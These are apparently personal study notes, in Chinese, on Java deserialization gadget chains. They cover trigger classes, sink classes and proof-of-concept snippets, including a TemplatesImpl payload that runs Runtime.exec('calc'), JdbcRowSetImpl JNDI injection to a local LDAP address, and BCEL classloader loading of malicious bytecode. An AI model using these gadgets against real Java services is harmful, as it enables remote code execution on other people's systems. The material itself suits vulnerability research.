# java gadget

> 介绍的java gadget都是自己分析组件遇到的。。

## 简单介绍
反序列化过程==将字节流还原成对象实例的过程
反序列化过程==创建空对象+设置对象属性的过程（readObject()函数负责）
反序列化过程==**类的加载+创建对象+调用readObject**

## 思路
Java序列化 基本上找readobject 然后看里面的方法和我们可以控制的参数基本上参数是通过构造方法获得的，然后利用方法去触发下一个方法。或者是利用代理触发invoke方法需要满足代码东西实现invokeHaeder方法。

## readobject

```java
AnnotationInvocationHandler
HashMap#hashCode
PriorityQueue
Hashtable
HashSet  
  
C3P0
PoolBackedDataSourceBase

tostring
BadAttributeValueExpException

BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException("");
Field valField = BadAttributeValueExpException.class.getDeclaredField("val");
valField.setAccessible(true);
valField.set(badAttributeValueExpException,xxxxx);


Vaadin
NestedMethodProperty

FileUpload
DiskFileItem
```

## invoke代理

```
AnnotationInvocationHandler
AnnotationInvocationHandler#equalsImpl
```

## 危险类

```
InvokerTransformer#transform
InstantiateTransformer#transform
BeanComparator#compare
PropertyUtils.getProperty(new CBtest(),"name");//调用get方法 getName
```

TemplatesImpl

```java
我们从TransletClassLoader#defineClass()向前追溯一下调用链：

TemplatesImpl#getOutputProperties() -> TemplatesImpl#newTransformer() -> TemplatesImpl#getTransletInstance() -> TemplatesImpl#defineTransletClasses() -> TransletClassLoader#defineClass()

追到最前面两个方法TemplatesImpl#getOutputProperties()、TemplatesImpl#newTransformer()，这两者的作用域是public，可以被外部调用。我们尝试用newTransformer()构造一个简单的POC...
    

#无参数的invoke
ReflectionUtils.invokeMethod(newTransformer, TemplatesImpl);

TemplatesImpl.getOutputProperties()
  TemplatesImpl.newTransformer()
  	TemplatesImpl.getTransletInstance()
  		TemplatesImpl.defineTransletClasses()
  			TransletClassLoader.defineClass()
  			
        
利用代码
ClassPool pool = ClassPool.getDefault();
pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
CtClass cc = pool.makeClass("Cat");
String cmd = "java.lang.Runtime.getRuntime().exec(\"calc\");";
cc.makeClassInitializer().insertBefore(cmd);
String randomClassName = "EvilCat" + System.nanoTime();
cc.setName(randomClassName);
cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); 
byte[] classBytes = cc.toBytecode();
byte[][] targetByteCodes = new byte[][]{classBytes};
TemplatesImpl templates = TemplatesImpl.class.newInstance();
setFieldValue(templates, "_bytecodes", targetByteCodes);
setFieldValue(templates, "_name", "name");
setFieldValue(templates, "_class", null);
ObjectBean objectBean = new ObjectBean(Templates.class,templates);

public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
    final Field field = getField(obj.getClass(), fieldName);
    field.setAccessible(true);
    field.set(obj, value);
}
public static Field getField(final Class<?> clazz, final String fieldName) {
    Field field = null;
    try {
        field = clazz.getDeclaredField(fieldName);
        field.setAccessible(true);
    }
    catch (NoSuchFieldException ex) {
        if (clazz.getSuperclass() != null)
            field = getField(clazz.getSuperclass(), fieldName);
    }
    return field;
}
```

AnnotationInvocationHandler

```java
ObjectInputStream.readObject()
			AnnotationInvocationHandler.readObject()
				AnnotationInvocationHandler.invoke() (Proxy)
 							invoke

 
entrySet
AnnotationInvocationHandler 反序列化时调用 memberValues 中存放对象的 entrySet 对象

Class<?> c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
Constructor<?> constructor = c.getDeclaredConstructors()[0];
constructor.setAccessible(true);
// 创建 ConvertedClosure 的动态代理类实例
Map handler = (Map) Proxy.newProxyInstance(Class.class.getClassLoader(), new Class[]{Map.class}, closure);
// 使用动态代理初始化 AnnotationInvocationHandler
InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Target.class, handler);
```

JdbcRowSetImpl

```java
可以jndi注入

JdbcRowSetImpl rs = new JdbcRowSetImpl();
rs.setDataSourceName("ldap://127.0.0.1:2333/test");
Method method = JdbcRowSetImpl.class.getDeclaredMethod("getDatabaseMetaData");
```

HashMap

```
HashMap<Object, Object> map = new HashMap<>();
map.put(expression, "");
map.put("", "");

// 先放入带有无害的 ValueExpression，put 到 map 之后再反射写入 valueExpression 字段避免触发
Field field1 = expression.getClass().getDeclaredField("valueExpression");
field1.setAccessible(true);
field1.set(expression, valueExpression);
```



## 写文件

aspectjweaver组件

```
SimpleCache#put
```

## class.forname

这里我们使用com.sun.org.apache.bcel.internal.util.ClassLoader这个动态加载器。这个classloader允许传入经过BCEL编码的字节码内容(className),所以我们对恶意类的字节码进行BCEL编码,赋给className,classloader指定为这个加载器，调用class.forname(className, true, classloader)就会加载恶意类的静态代码块中的代码

## java内省

```
getReadMethod()，获得用于读取属性值的方法；getWriteMethod()，获得用于写入属性值的方法;

简单的说安全问题就是可以调用set和get方法

com.sun.syndication.feed.impl#ToStringBean
PropertyDescriptor[] pds = BeanIntrospector.getPropertyDescriptors(this._beanClass);
 Method pReadMethod = pds[i].getReadMethod();
 Object value = pReadMethod.invoke(this._obj, NO_PARAMS);
```
